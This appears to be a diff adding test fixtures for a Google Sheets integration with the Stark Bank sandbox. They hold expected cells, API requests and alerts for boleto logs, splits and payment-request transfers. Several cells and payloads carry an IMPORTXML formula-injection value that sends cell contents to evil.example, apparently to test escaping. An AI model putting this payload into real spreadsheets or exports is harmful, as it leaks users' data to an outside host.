+    "12,12|n|3.4191090086120774e+46",
+    "12,13|n|6001",
+    "12,14|n|2",
+    "12,15|t|loja,sp",
+    "12,16|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6001/pdf\", \"PDF\")",
+    "12,17|t|Rua A, 1",
+    "12,19|t|Centro",
+    "12,20|t|São Paulo",
+    "12,21|t|SP",
+    "12,22|t|01000-000",
+    "13,1|t|2024-03-05",
+    "13,2|t|pago",
+    "13,3|t|Empresa 100% Brasil",
+    "13,4|t|12.345.678/0001-90",
+    "13,5|n|0.9",
+    "13,6|n|0.99",
+    "13,7|n|-0.08999999999999997",
+    "13,10|t|2024-03-04",
+    "13,11|t|2024-04-10",
+    "13,12|n|0",
+    "13,13|n|6002",
+    "13,14|n|0",
+    "13,16|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6002/pdf\", \"PDF\")",
+    "13,17|t|Av. B",
+    "13,19|t|Bela Vista",
+    "13,20|t|Rio de Janeiro",
+    "13,21|t|RJ",
+    "13,22|t|20000-000",
+    "14,1|t|2024-03-04",
+    "14,2|t|pago",
+    "14,3|t|@handle e 'aspas' \"duplas\"",
+    "14,4|n|98765432100",
+    "14,5|n|25",
+    "14,6|n|25",
+    "14,10|t|2024-03-05",
+    "14,11|t|2023-12-31",
+    "14,12|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "14,13|n|6003",
+    "14,14|n|0.01",
+    "14,15|t|a,b,c",
+    "14,16|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6003/pdf\", \"PDF\")",
+    "14,17|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "14,19|t|x",
+    "14,20|t|y",
+    "14,21|t|SP",
+    "14,22|t|01000-001"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/boleto/log",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "types": "paid"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/boleto/log",
+    "query": {
+     "types": "registered",
+     "boletoIds": "6001,6001"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/boleto/log",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "types": "paid",
+     "cursor": "2"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/boleto/log",
+    "query": {
+     "types": "registered",
+     "boletoIds": "6002,6003"
+    },
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "viewChargeEvents"
+   }
+  ]
+ },
+ "boletoEventsRegisteredLogsFail": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Histórico de Boletos Emitidos": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Data do Evento",
+    "10,2|t|Evento",
+    "10,3|t|Nome",
+    "10,4|t|CPF/CPNJ",
+    "10,5|t|Valor",
+    "10,6|t|Valor de Emissão",
+    "10,7|t|Desconto",
+    "10,8|t|Multa",
+    "10,9|t|Juros",
+    "10,10|t|Data de Emissão",
+    "10,11|t|Vencimento",
+    "10,12|t|Linha Digitável",
+    "10,13|t|Id do Boleto",
+    "10,14|t|Tarifa",
+    "10,15|t|Tags",
+    "10,16|t|Link PDF",
+    "10,17|t|Logradouro",
+    "10,18|t|Complemento",
+    "10,19|t|Bairro",
+    "10,20|t|Cidade",
+    "10,21|t|Estado",
+    "10,22|t|CEP",
+    "11,1|t|2024-03-05",
+    "11,2|t|pago",
+    "11,3|t|Maria O'Brien",
+    "11,4|t|012.345.678-90",
+    "11,5|n|155",
+    "11,10|t|2024-03-05",
+    "11,11|t|2024-04-09",
+    "11,12|n|3.4191090086120774e+46",
+    "11,13|n|6001",
+    "11,14|n|2",
+    "11,15|t|loja,sp",
+    "11,16|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6001/pdf\", \"PDF\")",
+    "11,17|t|Rua A, 1",
+    "11,18|t|Apto 2",
+    "11,19|t|Centro",
+    "11,20|t|São Paulo",
+    "11,21|t|SP",
+    "11,22|t|01000-000",
+    "11,30|t|sentinela AD11",
+    "12,1|t|2024-03-04",
+    "12,2|t|pago",
+    "12,3|t|Maria O'Brien",
+    "12,4|t|012.345.678-90",
+    "12,5|n|156",
+    "12,10|t|2024-03-05",
+    "12,11|t|2024-04-09",
+    "12,12|n|3.4191090086120774e+46",
+    "12,13|n|6001",
+    "12,14|n|2",
+    "12,15|t|loja,sp",
+    "12,16|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6001/pdf\", \"PDF\")",
+    "12,17|t|Rua A, 1",
+    "12,19|t|Centro",
+    "12,20|t|São Paulo",
+    "12,21|t|SP",
+    "12,22|t|01000-000"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/boleto/log",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "types": "paid"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/boleto/log",
+    "query": {
+     "types": "registered",
+     "boletoIds": "6001,6001"
+    },
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "viewChargeEvents",
+    "error": "Erro interno"
+   }
+  ]
+ },
+ "splits": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Split Consultas": [
+    "9,1|t|sentinela A9",
+    "11,1|t|2024-03-05T14:30:00.000000+00:00",
+    "11,2|t|invoice/7001",
+    "11,3|t|r1",
+    "11,4|t|012.345.678-90",
+    "11,5|n|3",
+    "11,6|t|success",
+    "11,30|t|sentinela AD11",
+    "12,1|t|2024-03-05T01:30:00.000000+00:00",
+    "12,2|t|invoice/7001",
+    "12,3|t|r2",
+    "12,4|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "12,5|n|2",
+    "12,6|t|processing",
+    "13,1|t|2024-03-05T14:30:00.000000+00:00",
+    "13,2|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "13,3|t|r1",
+    "13,4|t|012.345.678-90",
+    "13,5|n|0.01",
+    "13,6|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/split",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "status": "success"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/split-receiver",
+    "query": {
+     "ids": "r1,r2"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/split",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31",
+     "status": "success",
+     "cursor": "2"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/split-receiver",
+    "query": {
+     "ids": "r1"
+    },
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "viewSplits"
+   }
+  ]
+ },
+ "greetings": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}",
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Solicitação de Cartões": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Transferências": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Consulta de Transferência": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Consulta de Boleto": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Consulta de Invoices Emitidas": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Consulta de Chave PIX": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Transferência com Aprovação": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Extrato": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Consulta de Pagamento Boleto": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Consulta de Clientes": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Consulta de Aprovações": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Histórico de Boletos Emitidos": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Split Consultas": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Emissão de Boletos": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Cadastro de Clientes": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Pagamento de Boletos": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Emissão de Invoice Pix": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "Split Receivers": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ],
+   "corporateShopKits": [
+    "2,1|t|Olá, myworkspace!",
+    "3,1|t|Workspace: myworkspace",
+    "4,1|t|ID do Workspace: 5",
+    "5,1|t|E-mail: User+tag@Example.com",
+    "6,1|t|Ambiente: sandbox",
+    "7,1|t|Saldo: R$ 1.234,56"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/balance",
+    "query": {},
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "SetAllGreetings"
+   }
+  ]
+ },
+ "paymentRequestTransfers": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\":[\"341000112345-6Jose da Silva012.345.678-90123456fornecedor,abrilPagamento abril\",\"20018183123498765Empresa C Ltda12.345.678/0001-901000\",\"00143211=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")987654321001a=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")\"],\"boleto\":[]}"
+   ],
+   "Transferência com Aprovação": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Nome",
+    "10,2|t|CPF/CNPJ",
+    "10,3|t|Valor",
+    "10,4|t|Código do Banco / ISPB",
+    "10,5|t|Agência",
+    "10,6|t|Conta",
+    "10,7|t|Data de Agendamento",
+    "10,8|t|Tipo de conta (opcional)",
+    "10,9|t|Tags",
+    "10,10|t|Descrição",
+    "10,11|t|Mensagem para o recebedor",
+    "11,1|t|José da Silva",
+    "11,2|t|012.345.678-90",
+    "11,3|n|1234.56",
+    "11,4|t|341",
+    "11,5|t|0001",
+    "11,6|t|12345-6",
+    "11,7|d|date:2024-04-10T03:00:00.000Z",
+    "11,8|t|checking",
+    "11,9|t|fornecedor,abril",
+    "11,10|t|Pagamento abril",
+    "11,11|t|Obrigado",
+    "11,12|t|Enviado",
+    "11,30|t|sentinela AD11",
+    "12,1|t|Empresa Ç Ltda",
+    "12,2|t|12.345.678/0001-90",
+    "12,3|n|10",
+    "12,4|t|20018183",
+    "12,5|t|1234",
+    "12,6|t|98765",
+    "12,12|t|Enviado",
+    "13,1|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "13,2|t|98765432100",
+    "13,3|n|0.01",
+    "13,4|t|001",
+    "13,5|t|4321",
+    "13,6|t|1",
+    "13,8|t|savings",
+    "13,9|t|a",
+    "13,10|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "13,12|t|Enviado"
+   ]
+  },
+  "requests": [
+   {
+    "method": "POST",
+    "path": "/payment-request",
+    "query": {},
+    "payload": {
+     "requests": [
+      {
+       "centerId": "center-1",
+       "type": "transfer",
+       "payment": {
+        "name": "Jose da Silva",
+        "taxId": "012.345.678-90",
+        "amount": 123456,
+        "bankCode": "341",
+        "branchCode": "0001",
+        "accountNumber": "12345-6",
+        "accountType": "checking",
+        "description": "Pagamento abril",
+        "displayDescription": "Obrigado"
+       },
+       "tags": [
+        "fornecedor",
+        "abril"
+       ],
+       "due": "2024-04-10"
+      },
+      {
+       "centerId": "center-1",
+       "type": "transfer",
+       "payment": {
+        "name": "Empresa C Ltda",
+        "taxId": "12.345.678/0001-90",
+        "amount": 1000,
+        "bankCode": "20018183",
+        "branchCode": "1234",
+        "accountNumber": "98765"
+       }
+      },
+      {
+       "centerId": "center-1",
+       "type": "transfer",
+       "payment": {
+        "name": "=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+        "taxId": "98765432100",
+        "amount": 1,
+        "bankCode": "001",
+        "branchCode": "4321",
+        "accountNumber": "1",
+        "accountType": "savings",
+        "description": "=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")"
+       },
+       "tags": [
+        "a"
+       ]
+      }
+     ]
+    }
+   }
+  ],
+  "messages": [],
+  "alerts": [
+   "Todos os itens foram enviados."
+  ],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "managePaymentRequestTransfer"
+   }
+  ]
+ },
+ "paymentRequestTransfersRejected": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Transferência com Aprovação": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Nome",
+    "10,2|t|CPF/CNPJ",
+    "10,3|t|Valor",
+    "10,4|t|Código do Banco / ISPB",
+    "10,5|t|Agência",
+    "10,6|t|Conta",
+    "10,7|t|Data de Agendamento",
+    "10,8|t|Tipo de conta (opcional)",
+    "10,9|t|Tags",
+    "10,10|t|Descrição",
+    "10,11|t|Mensagem para o recebedor",
+    "11,1|t|José da Silva",
+    "11,2|t|012.345.678-90",
+    "11,3|n|1234.56",
+    "11,4|t|341",
+    "11,5|t|0001",
+    "11,6|t|12345-6",
+    "11,7|d|date:2024-04-10T03:00:00.000Z",
+    "11,8|t|checking",
+    "11,9|t|fornecedor,abril",
+    "11,10|t|Pagamento abril",
+    "11,11|t|Obrigado",
+    "11,12|t|Não enviado",
+    "11,30|t|sentinela AD11",
+    "12,1|t|Empresa Ç Ltda",
+    "12,2|t|12.345.678/0001-90",
+    "12,3|n|10",
+    "12,4|t|20018183",
+    "12,5|t|1234",
+    "12,6|t|98765",
+    "12,12|t|Falha",
+    "12,13|t| conta inválida",
+    "13,1|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "13,2|t|98765432100",
+    "13,3|n|0.01",
+    "13,4|t|001",
+    "13,5|t|4321",
+    "13,6|t|1",
+    "13,8|t|savings",
+    "13,9|t|a",
+    "13,10|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "13,12|t|Falha",
+    "13,13|t| nome inválido"
+   ]
+  },
+  "requests": [
+   {
+    "method": "POST",
+    "path": "/payment-request",
+    "query": {},
+    "payload": {
+     "requests": [
+      {
+       "centerId": "center-1",
+       "type": "transfer",
+       "payment": {
+        "name": "Jose da Silva",
+        "taxId": "012.345.678-90",
+        "amount": 123456,
+        "bankCode": "341",
+        "branchCode": "0001",
+        "accountNumber": "12345-6",
+        "accountType": "checking",
+        "description": "Pagamento abril",
+        "displayDescription": "Obrigado"
+       },
+       "tags": [
+        "fornecedor",
+        "abril"
+       ],
+       "due": "2024-04-10"
+      },
+      {
+       "centerId": "center-1",
+       "type": "transfer",
+       "payment": {
+        "name": "Empresa C Ltda",
+        "taxId": "12.345.678/0001-90",
+        "amount": 1000,
+        "bankCode": "20018183",
+        "branchCode": "1234",
+        "accountNumber": "98765"
+       }
+      },
+      {
+       "centerId": "center-1",
+       "type": "transfer",
+       "payment": {
+        "name": "=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+        "taxId": "98765432100",
+        "amount": 1,
+        "bankCode": "001",
+        "branchCode": "4321",
+        "accountNumber": "1",
+        "accountType": "savings",
+        "description": "=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")"
+       },
+       "tags": [
+        "a"
+       ]
+      }
+     ]
+    }
+   }
+  ],
+  "messages": [],
+  "alerts": [
+   "Falha no envio, verifique a situação de suas solicitações.\n\nErro - Linha 12: conta inválida\nErro - Linha 13: nome inválido\n"
+  ],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "managePaymentRequestTransfer"
+   }
+  ]
+ },
+ "paymentRequestTransfersTwice": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\":[\"341000112345-6Jose da Silva012.345.678-90123456fornecedor,abrilPagamento abril\",\"20018183123498765Empresa C Ltda12.345.678/0001-901000\",\"00143211=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")987654321001a=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")\"],\"boleto\":[]}"
+   ],
+   "Transferência com Aprovação": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Nome",
+    "10,2|t|CPF/CNPJ",
+    "10,3|t|Valor",
+    "10,4|t|Código do Banco / ISPB",
+    "10,5|t|Agência",
+    "10,6|t|Conta",
+    "10,7|t|Data de Agendamento",
+    "10,8|t|Tipo de conta (opcional)",
+    "10,9|t|Tags",
+    "10,10|t|Descrição",
+    "10,11|t|Mensagem para o recebedor",
+    "11,1|t|José da Silva",
+    "11,2|t|012.345.678-90",
+    "11,3|n|1234.56",
+    "11,4|t|341",
+    "11,5|t|0001",
+    "11,6|t|12345-6",
+    "11,7|d|date:2024-04-10T03:00:00.000Z",
+    "11,8|t|checking",
+    "11,9|t|fornecedor,abril",
+    "11,10|t|Pagamento abril",
+    "11,11|t|Obrigado",
+    "11,12|t|Pagamento duplicado",
+    "11,30|t|sentinela AD11",
+    "12,1|t|Empresa Ç Ltda",
+    "12,2|t|12.345.678/0001-90",
+    "12,3|n|10",
+    "12,4|t|20018183",
+    "12,5|t|1234",
+    "12,6|t|98765",
+    "12,12|t|Pagamento duplicado",
+    "13,1|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "13,2|t|98765432100",
+    "13,3|n|0.01",
+    "13,4|t|001",
+    "13,5|t|4321",
+    "13,6|t|1",
+    "13,8|t|savings",
+    "13,9|t|a",
+    "13,10|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+    "13,12|t|Pagamento duplicado"
+   ]
+  },
+  "requests": [
+   {
+    "method": "POST",
+    "path": "/payment-request",
+    "query": {},
+    "payload": {
+     "requests": [
+      {
+       "centerId": "center-1",
+       "type": "transfer",
+       "payment": {
+        "name": "Jose da Silva",
+        "taxId": "012.345.678-90",
+        "amount": 123456,
+        "bankCode": "341",
+        "branchCode": "0001",
+        "accountNumber": "12345-6",
+        "accountType": "checking",
+        "description": "Pagamento abril",
+        "displayDescription": "Obrigado"
+       },
+       "tags": [
+        "fornecedor",
+        "abril"
+       ],
+       "due": "2024-04-10"
+      },
+      {
+       "centerId": "center-1",
+       "type": "transfer",
+       "payment": {
+        "name": "Empresa C Ltda",
+        "taxId": "12.345.678/0001-90",
+        "amount": 1000,
+        "bankCode": "20018183",
+        "branchCode": "1234",
+        "accountNumber": "98765"
+       }
+      },
+      {
+       "centerId": "center-1",
+       "type": "transfer",
+       "payment": {
+        "name": "=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
+        "taxId": "98765432100",
+        "amount": 1,
+        "bankCode": "001",
+        "branchCode": "4321",
+        "accountNumber": "1",
+        "accountType": "savings",
+        "description": "=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")"
+       },
+       "tags": [
+        "a"
+       ]
+      }
+     ]
+    }
+   }
+  ],
+  "messages": [],
+  "alerts": [
+   "Todos os itens foram enviados.",
+   "Você está enviando pagamentos duplicados, remova as duplicadas e tente novamente."
+  ],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "managePaymentRequestTransfer"
+   },
+   {
+    "name": "managePaymentRequestTransfer"
+   }
+  ]
+ },
+ "paymentRequestTransfersRepeatedRow": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Transferência com Aprovação": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Nome",
+    "10,2|t|CPF/CNPJ",
+    "10,3|t|Valor",
+    "10,4|t|Código do Banco / ISPB",
+    "10,5|t|Agência",
+    "10,6|t|Conta",
+    "10,7|t|Data de Agendamento",
+    "10,8|t|Tipo de conta (opcional)",
+    "10,9|t|Tags",
+    "10,10|t|Descrição",
+    "10,11|t|Mensagem para o recebedor",
+    "11,1|t|José da Silva",
+    "11,2|t|012.345.678-90",
+    "11,3|n|1234.56",
+    "11,4|t|341",
+    "11,5|t|0001",
+    "11,6|t|12345-6",
+    "11,7|d|date:2024-04-10T03:00:00.000Z",
+    "11,8|t|checking",
+    "11,9|t|fornecedor,abril",
+    "11,10|t|Pagamento abril",
+    "11,11|t|Obrigado",
+    "11,12|t|Não enviado",
+    "11,30|t|sentinela AD11",
+    "12,1|t|Empresa Ç Ltda",
+    "12,2|t|12.345.678/0001-90",
+    "12,3|n|10",
+    "12,4|t|20018183",
+    "12,5|t|1234",
+    "12,6|t|98765",
+    "12,12|t|Não enviado",
+    "13,1|t|José da Silva",
+    "13,2|t|012.345.678-90",
+    "13,3|n|1234.56",
+    "13,4|t|341",
+    "13,5|t|0001",
+    "13,6|t|12345-6",
+    "13,7|d|date:2024-04-10T03:00:00.000Z",
+    "13,8|t|checking",
+    "13,9|t|fornecedor,abril",
+    "13,10|t|Pagamento abril",
+    "13,11|t|Obrigado",
+    "13,12|t|Pagamento duplicado"
+   ]
+  },
+  "requests": [],
+  "messages": [],
+  "alerts": [
+   "Você está enviando pagamentos duplicados, remova as duplicadas e tente novamente."
+  ],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "managePaymentRequestTransfer"
+   }
+  ]
+ },
+ "paymentRequestTransfersNumericTaxId": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Transferência com Aprovação": [
+    "9,1|t|sentinela A9",
+    "10,1|t|Nome",
+    "10,2|t|CPF/CNPJ",
+    "10,3|t|Valor",
+    "10,4|t|Código do Banco / ISPB",
+    "10,5|t|Agência",
+    "10,6|t|Conta",
+    "10,7|t|Data de Agendamento",
+    "10,8|t|Tipo de conta (opcional)",
+    "10,9|t|Tags",
+    "10,10|t|Descrição",
+    "10,11|t|Mensagem para o recebedor",
+    "11,1|t|José da Silva",
+    "11,2|n|1234567890",
+    "11,3|n|10",
+    "11,4|t|341",
+    "11,5|t|0001",
